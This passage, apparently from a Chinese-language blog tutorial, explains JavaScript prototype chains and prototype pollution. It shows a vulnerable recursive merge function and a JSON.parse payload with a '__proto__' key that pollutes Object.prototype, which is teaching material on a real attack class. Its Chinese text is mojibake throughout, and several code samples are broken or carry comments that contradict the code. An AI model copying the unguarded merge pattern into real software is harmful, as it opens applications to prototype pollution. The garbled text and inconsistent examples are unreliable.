class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> == foo.<span class="hljs-property">__proto__</span> <span class="hljs-comment">//fooå¯¹è±¡çš„__proto__å±æ€§ç­‰äºFoo.prototype</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/img/nodejs1.png" alt="nodejs1"></p><p>ä»¥åŠ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br>son.<span class="hljs-property">__proto__</span>[<span class="hljs-string">&#x27;add_name&#x27;</span>] = <span class="hljs-string">&#x27;abc&#x27;</span><br><span class="hljs-keyword">let</span> son1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son1 Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-comment">//ç»“æœï¼š son Name: abc</span><br><span class="hljs-comment">//son1 Name: abc</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ˜æ˜åªä¿®æ”¹äº†<code>son</code>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼Œä½†ç”±äºæœ‰å…¶å®ƒå¯¹è±¡çš„åŸå‹å±æ€§æŒ‡å‘äº†ç›¸åŒçš„åŸå‹å±æ€§(å³<code>son1.__proto__</code>ä¸å…¶ç›¸åŒ)ï¼Œå¯¼è‡´å¦å¤–ä¸€ä¸ªå…·æœ‰ç›¸åŒåŸå‹çš„å¯¹è±¡ä¹Ÿå—åˆ°äº†å½±å“ã€‚</p><p>å†çœ‹ä¸€æ®µ<code>js</code>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br> <br><span class="hljs-comment">// foo.bar æ­¤æ—¶ä¸º1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰ï¼Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œå®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectç±»ï¼Œç»™å…¶å¢åŠ äº†ä¸€ä¸ªå±æ€§bar,å€¼ä¸º2</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br> <br><span class="hljs-comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡ï¼Œä»–ä¼šæœ‰ä¸€ä¸ªbarå±æ€§</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br> <br><span class="hljs-comment">// æŸ¥çœ‹zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br><span class="hljs-comment">//æœ€åï¼Œè™½ç„¶zooæ˜¯ä¸€ä¸ªç©ºå¯¹è±¡&#123;&#125;ï¼Œä½†zoo.barçš„ç»“æœå±…ç„¶æ˜¯2ï¼š</span><br><span class="hljs-comment">//å‚è€ƒï¼šhttps://blog.csdn.net/qq_51586883/article/details/119867720</span><br></code></pre></td></tr></table></figure><p>å†é€šè¿‡ä¸€æ®µä»£ç åŠ æ·±åŠ æ·±å°è±¡ :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;D&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;A&#x27;</span><br>&#125;<br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;D&#x27;, last_name: &#x27;K&#x27; &#125;</span><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;A&#x27; &#125;</span><br>son.<span class="hljs-property">last_name</span> <span class="hljs-comment">// &#x27;K&#x27;</span><br><span class="hljs-comment">//æ³¨æ„ï¼Œæ­¤æ—¶Son.prototype=son.__proto__</span><br><br>son.<span class="hljs-property">__proto__</span>  <span class="hljs-comment">//Foo &#123; first_name: &#x27;Donald&#x27;, last_name: &#x27;Trump&#x27; &#125;</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property">add_name</span>=<span class="hljs-string">&#x27;viper&#x27;</span><br>son.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefined</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefinedï¼Œæ„é€ å‡½æ•°çš„å±æ€§å’Œæ–¹æ³•è¦é€šè¿‡åˆ›å»ºå®ä¾‹æ‰èƒ½è®¿é—®</span><br><span class="hljs-title class_">Foo</span> <span class="hljs-comment">//[Function: Foo] &#123; add_name: &#x27;viper&#x27; &#125;,æ³¨æ„è¿™é‡Œè§£é‡Šäº†ä¸ºå•¥Son/son.add_nameæ²¡å®šä¹‰</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-string">&#x27;add_name&#x27;</span>]=<span class="hljs-string">&#x27;notbad&#x27;</span><span class="hljs-comment">//æ³¨æ„è¿™é‡Œ</span><br>son.<span class="hljs-property">add_name</span><span class="hljs-comment">//&#x27;notbad&#x27;</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span><span class="hljs-comment">//undefinedï¼ŒåŒä¸Š</span><br><br><span class="hljs-title class_">JavaScript</span> çš„æŸ¥æ‰¾æœºåˆ¶å¦‚ä¸‹ï¼š<br><br>åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name<br>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨son.<span class="hljs-property">__proto__</span>ä¸­å¯»æ‰¾last_name<br>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>ä¸­å¯»æ‰¾last_name<br>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<span class="hljs-literal">null</span>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> çš„ __proto__å°±æ˜¯ <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>1.æ„é€ å‡½æ•°.prototypeæŒ‡å‘çš„æ˜¯ä¸€ä¸ªå¯¹è±¡(åŸå‹)ã€‚</p><p>2.ä»»ä½•å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œè¿™ä¸ªåŸå‹å¯¹è±¡ç”±å¯¹è±¡çš„å†…ç½®å±æ€§__proto__æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„prototypeæŒ‡å‘çš„å¯¹è±¡ï¼Œå³ä»»ä½•å¯¹è±¡éƒ½æ˜¯ç”±ä¸€ä¸ªæ„é€ å‡½æ•°åˆ›å»ºçš„ã€‚</p><p>3.åªæœ‰æ„é€ å‡½æ•°å†…æ‰æœ‰ptorotypeå±æ€§ã€‚</p><p>4.æ¯ä¸ªå¯¹è±¡éƒ½å†…å«æœ‰ä¸€ä¸ªå±æ€§ï¼š<strong>proto</strong>,ä¹Ÿå°±æ˜¯è¯´å°±ç®—å¯¹è±¡é‡Œé¢æ²¡æœ‰å¯¹è¿™ä¸ªå±æ€§è¿›è¡Œèµ‹å€¼ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯æœ‰è¿™ä¸ªå±æ€§çš„ã€‚</p><p>5.åŸå‹é“¾çš„æ ¸å¿ƒå°±æ˜¯ä¾èµ–å¯¹è±¡__proto__çš„æŒ‡å‘ï¼Œå½“è®¿é—®çš„å±æ€§åœ¨è¯¥å¯¹è±¡ä¸å­˜åœ¨æ—¶ï¼Œå°±ä¼šå‘ä¸Šä»è¯¥å¯¹è±¡æ„é€ å‡½æ•°çš„prototypeçš„è¿›è¡ŒæŸ¥æ‰¾ï¼Œç›´è‡³æŸ¥æ‰¾åˆ°Objectæ—¶ï¼Œå°±æ²¡æœ‰æŒ‡å‘äº†ã€‚å¦‚æœæœ€ç»ˆæŸ¥æ‰¾å¤±è´¥ä¼šè¿”å›undefinedæˆ–æŠ¥é”™ã€‚</p><p>é€šè¿‡ä¸€æ®µ<code>java</code>ä»£ç å¯¹æ¯”ä¸¤è€…çš„å¼‚åŒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Test;<span class="hljs-comment">//åŒ…åä¸ºTestçš„ç±»</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<span class="hljs-comment">//å…¬å…±å­—ç¬¦ä¸²å±æ€§name</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<span class="hljs-comment">//Sonç±»ç»§æ‰¿è‡ªFatherç±»</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Son</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">super</span>.name = <span class="hljs-string">&quot;father&quot;</span>;<span class="hljs-comment">//super å…³é”®å­—ç”¨äºåœ¨å­ç±»ä¸­è®¿é—®çˆ¶ç±»çš„æˆå‘˜å˜é‡ã€æ–¹æ³•å’Œæ„é€ å‡½æ•°ã€‚</span><br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">alert</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//alertæ–¹æ³•ï¼Œè¿”å›ç±»å‹ä¸ºvoid(ä¸ä¼šè¿”å›ä»»ä½•å€¼)</span><br>        System.out.println(<span class="hljs-string">&quot;i am son&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s1.name);<span class="hljs-comment">//System.outæ˜¯ä¸€ä¸ªæ ‡å‡†è¾“å‡ºæµå¯¹è±¡ï¼Œprintln()æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå°†æŒ‡å®šçš„å‚æ•°æ‰“å°åˆ°æ§åˆ¶å°ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚</span><br>        s1.name = <span class="hljs-string">&quot;son&quot;</span>;<br>        System.out.println(s1.name);<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s2.name);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»“æœï¼š</span><br>father<br>son<br>father<br></code></pre></td></tr></table></figure><p><code>javaæ˜¯åŸºäºå¯¹è±¡ç»§æ‰¿ï¼Œjavascriptæ˜¯åŸºäºåŸå‹ç»§æ‰¿</code></p><h4 id="æ±¡æŸ“åŸç†"><a href="#æ±¡æŸ“åŸç†" class="headerlink" title="æ±¡æŸ“åŸç†"></a>æ±¡æŸ“åŸç†</h4><p>å¯¹äºè¯­å¥ï¼š<code>object[a][b] = value</code> å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º<code>__proto__</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡</p><h4 id="åˆ©ç”¨æ‰‹æ®µ"><a href="#åˆ©ç”¨æ‰‹æ®µ" class="headerlink" title="åˆ©ç”¨æ‰‹æ®µ"></a>åˆ©ç”¨æ‰‹æ®µ</h4><p>ç°åœ¨æˆ‘ä»¬å¤§è‡´å¯ä»¥çŸ¥é“ï¼šå¦‚æœå¯ä»¥é€šè¿‡æŸç§æ–¹æ³•æ§åˆ¶<code>å¯¹è±¡.__proto__</code>çš„å€¼ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é—´æ¥ä¿®æ”¹ç»§æ‰¿è¯¥åŸå‹å¯¹è±¡çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><p>1.<strong>å¯¹è±¡merge</strong> <strong>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</strong> ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//ç”¨äºå°†ä¸€ä¸ªæºå¯¹è±¡çš„å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡ä¸­</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//éå†sourceçš„æ‰€æœ‰å±æ€§</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//å¯¹äºæ¯ä¸ªå±æ€§ï¼Œè‹¥åŒæ—¶å­˜åœ¨äºæºå¯¹è±¡å’Œç›®æ ‡å¯¹è±¡ä¸­</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªåµŒå¥—å¯¹è±¡ï¼Œéœ€è¦é€’å½’è°ƒç”¨mergeå‡½æ•°ï¼Œå°†æºå¯¹è±¡çš„åµŒå¥—å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡çš„å¯¹åº”åµŒå¥—å±æ€§ä¸­ã€‚</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//éåµŒå¥—å±æ€§ï¼Œç›´æ¥å°†æºå¯¹è±¡çš„å±æ€§å€¼èµ‹ç»™ç›®æ ‡å¯¹è±¡çš„å¯¹åº”å±æ€§ã€‚</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œå¦‚æœæˆ‘ä»¬è®©keyæ˜¯<code>__proto__</code>çš„è¯é‚£ä¹ˆæ˜¯ä¸æ˜¯å°±å¯ä»¥å¯¹åŸå‹é€ æˆå½±å“ï¼Œæœ€ç»ˆå½±å“åˆ°å®ä¾‹åŒ–å‡ºæ¥çš„ç±»å‘¢ï¼Ÿ</strong></p><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<span class="hljs-comment">//1,2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1)<span class="hljs-comment">//&#123; a: 1, b: 2 &#125;,protoæ²¡æœ‰è¢«å½“åšé”®å</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆ<code>o1</code>è¢«æ±¡æŸ“äº†è€Œ<code>o3</code>æ²¡æœ‰è¢«æ±¡æŸ“?</p><p>æ‰“å¼€nodeçœ‹ä¸‹<code>o2</code>çš„<code>key</code>ï¼š</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">Welcome to Node.js v18.18.0.<br>Type &quot;.help&quot; for more information.<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">b</span>:<span class="hljs-number">2</span>&#125;&#125;</span><br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> o2)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key);&#125;</span><br>a<br>b<br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2</span><br>&#123; a: 1 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span></span><br>&#123; b: 2 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>[Object: null prototype] &#123;&#125;  //æœ€ä¸Šå±‚çš„objectï¼Œå¹¶æ²¡æœ‰ä»»ä½•å±æ€§<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>null<br>&gt;å¯ä»¥çœ‹åˆ°o2çš„keyåªæœ‰a,bæ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„__proto__ï¼Œå¹¶æ³¨æ„æœ€åå‡ è¡Œï¼<br></code></pre></td></tr></table></figure><p>åŸå› å¾ˆå¥½ç†è§£ï¼šåœ¨<code>o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;</code>ä¸­ï¼Œ<code>&quot;__proto__&quot;:&#123;b:2&#125;</code>ç­‰ä»·äº<code>o2.__proto__=&#123;b:2&#125;</code>ï¼Œä¹Ÿå°±æ˜¯<code>o2</code>è¿™ä¸ªå®ä¾‹çš„<code>__proto__</code>å±æ€§ã€‚<code>__proto__</code>å¹¶æ²¡è¢«å½“æˆé”®åè§£æã€‚</p><p>æˆ‘ä»¬éœ€è¦è¿™æ ·ä¿®æ”¹(<code>åˆ©ç”¨JSON.parse</code>)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//JSON.parseçš„å­˜åœ¨å¯ä»¥å°†JSONå­—ç¬¦ä¸²è§£æä¸ºJavaScriptå¯¹è±¡ï¼Œè¿™æ ·ä¸€æ¥å°±å­˜åœ¨o2.__protp__.b=2,å¹¶æŠŠè¿™ä¸œè¥¿èµ‹å€¼ç»™ä¹‹å‰ä¸å­˜åœ¨çš„o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 